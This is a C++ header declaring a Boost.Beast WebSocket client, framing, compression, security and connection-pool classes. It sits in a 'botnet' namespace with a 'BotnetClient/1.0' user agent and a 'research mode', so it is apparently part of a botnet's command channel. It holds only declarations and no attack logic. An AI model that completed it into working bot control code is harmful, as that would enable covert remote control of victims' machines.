#pragma once

#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <boost/beast/websocket.hpp>
#include <string>
#include <memory>
#include <functional>
#include <queue>
#include <mutex>
#include <chrono>
#include "message.h"
#include "crypto/encryption.h"

namespace botnet {
namespace protocol {

/**
 * @brief Cross-platform WebSocket client for real-time communication
 * 
 * Single implementation using Boost.Beast that works identically
 * on Windows, Linux, and macOS. Supports both WS and WSS.
 */
class WebSocketClient {
public:
    using MessageCallback = std::function<void(std::unique_ptr<Message>)>;
    using ConnectionCallback = std::function<void(bool connected, const std::string& error)>;
    using ErrorCallback = std::function<void(const std::string& error)>;

    enum class ConnectionState {
        DISCONNECTED,
        CONNECTING,
        CONNECTED,
        DISCONNECTING,
        ERROR_STATE
    };

public:
    explicit WebSocketClient(boost::asio::io_context& io_context);
    ~WebSocketClient();

    // Connection management
    bool Connect(const std::string& host, uint16_t port, const std::string& path = "/ws", bool use_ssl = true);
    void Disconnect();
    bool IsConnected() const;
    ConnectionState GetConnectionState() const;

    // Message operations
    bool SendMessage(std::unique_ptr<Message> message);
    bool SendEncryptedMessage(std::unique_ptr<Message> message, const crypto::AESEncryption& encryption);
    bool SendTextMessage(const std::string& text);
    bool SendBinaryMessage(const std::vector<uint8_t>& data);

    // Callbacks
    void SetMessageCallback(MessageCallback callback);
    void SetConnectionCallback(ConnectionCallback callback);
    void SetErrorCallback(ErrorCallback callback);

    // Configuration
    void SetTimeout(std::chrono::seconds timeout);
    void SetReconnectEnabled(bool enabled);
    void SetReconnectInterval(std::chrono::seconds interval);
    void SetMaxReconnectAttempts(uint32_t max_attempts);
    void SetHeartbeatInterval(std::chrono::seconds interval);

    // WebSocket specific
    void SetSubprotocols(const std::vector<std::string>& protocols);
    void SetHeaders(const std::map<std::string, std::string>& headers);
    void SetUserAgent(const std::string& user_agent);

    // SSL configuration
    void SetSSLVerification(bool enabled);
    void AddTrustedCertificate(const std::string& cert_pem);

    // Research mode
    void EnableResearchMode(bool enabled);
    void SetResearchLogging(bool enabled);
    std::vector<std::string> GetConnectionLog() const;

    // Statistics
    struct ConnectionStats {
        uint32_t total_connections;
        uint32_t successful_connections;
        uint32_t reconnection_attempts;
        uint32_t messages_sent;
        uint32_t messages_received;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        std::chrono::system_clock::time_point last_connection;
        std::chrono::milliseconds average_ping;
    };

    ConnectionStats GetStats() const;
    void ResetStats();

private:
    using tcp = boost::asio::ip::tcp;
    using websocket_stream = boost::beast::websocket::stream<boost::beast::tcp_stream>;
    using websocket_ssl_stream = boost::beast::websocket::stream<boost::beast::ssl_stream<boost::beast::tcp_stream>>;

    boost::asio::io_context& io_context_;
    std::unique_ptr<websocket_stream> ws_stream_;
    std::unique_ptr<websocket_ssl_stream> wss_stream_;
    boost::asio::ssl::context ssl_context_;
    tcp::resolver resolver_;

    // Connection state
    std::string host_;
    uint16_t port_;
    std::string path_;
    bool use_ssl_;
    ConnectionState state_;

    // Configuration
    std::chrono::seconds timeout_{30};
    bool reconnect_enabled_{true};
    std::chrono::seconds reconnect_interval_{5};
    uint32_t max_reconnect_attempts_{10};
    uint32_t current_reconnect_attempts_{0};
    std::chrono::seconds heartbeat_interval_{30};

    // WebSocket specific
    std::vector<std::string> subprotocols_;
    std::map<std::string, std::string> headers_;
    std::string user_agent_{"BotnetClient/1.0"};

    // SSL configuration
    bool ssl_verification_enabled_{true};
    std::vector<std::string> trusted_certificates_;

    // Callbacks
    MessageCallback message_callback_;
    ConnectionCallback connection_callback_;
    ErrorCallback error_callback_;

    // Message queue
    std::queue<std::vector<uint8_t>> send_queue_;
    std::mutex send_queue_mutex_;
    bool writing_{false};

    // Timers
    std::unique_ptr<boost::asio::steady_timer> reconnect_timer_;
    std::unique_ptr<boost::asio::steady_timer> heartbeat_timer_;
    std::unique_ptr<boost::asio::steady_timer> timeout_timer_;

    // Read buffer
    boost::beast::flat_buffer read_buffer_;

    // Research mode
    bool research_mode_{false};
    bool research_logging_{false};
    mutable std::vector<std::string> connection_log_;

    // Statistics
    mutable std::mutex stats_mutex_;
    ConnectionStats stats_{};

    // Ping/pong tracking
    std::chrono::steady_clock::time_point last_ping_sent_;
    bool ping_outstanding_{false};

    // Internal connection methods
    void StartConnect();
    void HandleResolve(const boost::system::error_code& ec, tcp::resolver::results_type results);
    void HandleConnect(const boost::system::error_code& ec, tcp::resolver::results_type::endpoint_type endpoint);
    void HandleSSLHandshake(const boost::system::error_code& ec);
    void HandleWebSocketHandshake(const boost::system::error_code& ec);

    // Connection state management
    void SetConnectionState(ConnectionState state);
    void OnConnectionEstablished();
    void OnConnectionLost(const std::string& error);
    void StartReconnect();

    // Message handling
    void StartRead();
    void HandleRead(const boost::system::error_code& ec, std::size_t bytes_transferred);
    void ProcessIncomingMessage(const std::vector<uint8_t>& data);

    void StartWrite();
    void HandleWrite(const boost::system::error_code& ec, std::size_t bytes_transferred);
    void ProcessWriteQueue();

    // Heartbeat/ping handling
    void StartHeartbeat();
    void SendPing();
    void HandlePing(const boost::system::error_code& ec);
    void HandlePong(const std::vector<uint8_t>& payload);

    // Timeout handling
    void StartTimeoutTimer();
    void HandleTimeout(const boost::system::error_code& ec);
    void CancelTimeoutTimer();

    // Reconnection logic
    void HandleReconnectTimer(const boost::system::error_code& ec);
    bool ShouldAttemptReconnect() const;

    // SSL context initialization
    void InitializeSSLContext();
    bool VerifySSLCertificate(bool preverified, boost::asio::ssl::verify_context& ctx);

    // Utility methods
    void UpdateConnectionStats(bool connected);
    void UpdateMessageStats(bool sent, size_t bytes);
    void LogResearchActivity(const std::string& activity) const;

    // Error handling
    void HandleError(const std::string& error);
    void ReportError(const std::string& error);
};

/**
 * @brief WebSocket message framing for protocol compliance
 */
class WebSocketFraming {
public:
    enum class FrameType {
        TEXT = 0x1,
        BINARY = 0x2,
        CLOSE = 0x8,
        PING = 0x9,
        PONG = 0xA
    };

    struct Frame {
        FrameType type;
        std::vector<uint8_t> payload;
        bool final_fragment;
        bool masked;
        uint32_t mask_key;
    };

public:
    static std::vector<uint8_t> CreateFrame(FrameType type, const std::vector<uint8_t>& payload, bool mask = false);
    static Frame ParseFrame(const std::vector<uint8_t>& data);
    
    static std::vector<uint8_t> CreateTextFrame(const std::string& text, bool mask = false);
    static std::vector<uint8_t> CreateBinaryFrame(const std::vector<uint8_t>& data, bool mask = false);
    static std::vector<uint8_t> CreatePingFrame(const std::vector<uint8_t>& payload = {});
    static std::vector<uint8_t> CreatePongFrame(const std::vector<uint8_t>& payload = {});
    static std::vector<uint8_t> CreateCloseFrame(uint16_t code = 1000, const std::string& reason = "");

private:
    static uint32_t GenerateMaskKey();
    static void ApplyMask(std::vector<uint8_t>& payload, uint32_t mask_key);
};

/**
 * @brief WebSocket compression support (Per-Message-Deflate)
 */
class WebSocketCompression {
public:
    WebSocketCompression();
    ~WebSocketCompression();

    bool Initialize();
    
    // Compression
    std::vector<uint8_t> Compress(const std::vector<uint8_t>& data);
    std::vector<uint8_t> Decompress(const std::vector<uint8_t>& compressed_data);
    
    // Configuration
    void SetCompressionLevel(int level); // 1-9
    void SetWindowBits(int bits);        // 8-15
    void SetMemoryLevel(int level);      // 1-9
    
    // Statistics
    struct CompressionStats {
        uint64_t bytes_compressed;
        uint64_t bytes_decompressed;
        uint64_t total_input_bytes;
        uint64_t total_output_bytes;
        double compression_ratio;
    };
    
    CompressionStats GetStats() const;

private:
    void* compress_stream_;   // z_stream*
    void* decompress_stream_; // z_stream*
    bool initialized_;
    
    mutable std::mutex stats_mutex_;
    CompressionStats stats_{};
    
    void UpdateCompressionStats(uint64_t input_bytes, uint64_t output_bytes);
    void UpdateDecompressionStats(uint64_t input_bytes, uint64_t output_bytes);
};

/**
 * @brief WebSocket security features
 */
class WebSocketSecurity {
public:
    WebSocketSecurity();
    
    // Origin validation
    void SetAllowedOrigins(const std::vector<std::string>& origins);
    bool ValidateOrigin(const std::string& origin) const;
    
    // Subprotocol validation
    void SetAllowedSubprotocols(const std::vector<std::string>& protocols);
    bool ValidateSubprotocol(const std::string& protocol) const;
    
    // Rate limiting
    void SetRateLimit(uint32_t max_messages_per_second);
    bool CheckRateLimit();
    
    // Message size limits
    void SetMaxMessageSize(size_t max_size);
    bool ValidateMessageSize(size_t size) const;
    
    // Research mode security
    void EnableResearchMode(bool enabled);
    void AddResearchHeaders(std::map<std::string, std::string>& headers) const;

private:
    std::vector<std::string> allowed_origins_;
    std::vector<std::string> allowed_subprotocols_;
    
    // Rate limiting
    uint32_t max_messages_per_second_{100};
    std::chrono::steady_clock::time_point last_message_time_;
    uint32_t message_count_this_second_{0};
    
    size_t max_message_size_{1024 * 1024}; // 1MB default
    bool research_mode_{false};
};

/**
 * @brief WebSocket connection pool for multiple simultaneous connections
 */
class WebSocketConnectionPool {
public:
    explicit WebSocketConnectionPool(boost::asio::io_context& io_context);
    ~WebSocketConnectionPool();

    // Pool management
    std::string AddConnection(const std::string& host, uint16_t port, 
                             const std::string& path = "/ws", bool use_ssl = true);
    bool RemoveConnection(const std::string& connection_id);
    void RemoveAllConnections();
    
    // Connection operations
    bool Connect(const std::string& connection_id);
    bool Disconnect(const std::string& connection_id);
    bool IsConnected(const std::string& connection_id) const;
    
    // Message operations
    bool SendMessage(const std::string& connection_id, std::unique_ptr<Message> message);
    bool BroadcastMessage(std::unique_ptr<Message> message);
    
    // Callbacks (applied to all connections)
    void SetMessageCallback(WebSocketClient::MessageCallback callback);
    void SetConnectionCallback(WebSocketClient::ConnectionCallback callback);
    void SetErrorCallback(WebSocketClient::ErrorCallback callback);
    
    // Pool statistics
    struct PoolStats {
        uint32_t total_connections;
        uint32_t active_connections;
        uint32_t total_messages_sent;
        uint32_t total_messages_received;
        std::chrono::system_clock::time_point pool_created;
    };
    
    PoolStats GetPoolStats() const;
    std::vector<std::string> GetConnectionIds() const;

private:
    struct PoolConnection {
        std::string id;
        std::unique_ptr<WebSocketClient> client;
        std::string host;
        uint16_t port;
        std::string path;
        bool use_ssl;
        std::chrono::system_clock::time_point created;
    };
    
    boost::asio::io_context& io_context_;
    std::map<std::string, std::unique_ptr<PoolConnection>> connections_;
    mutable std::mutex connections_mutex_;
    
    // Callbacks
    WebSocketClient::MessageCallback message_callback_;
    WebSocketClient::ConnectionCallback connection_callback_;
    WebSocketClient::ErrorCallback error_callback_;
    
    // Statistics
    mutable std::mutex stats_mutex_;
    PoolStats stats_{};
    
    std::string GenerateConnectionId() const;
    void UpdateStats();
};

} // namespace protocol
} // namespace botnet
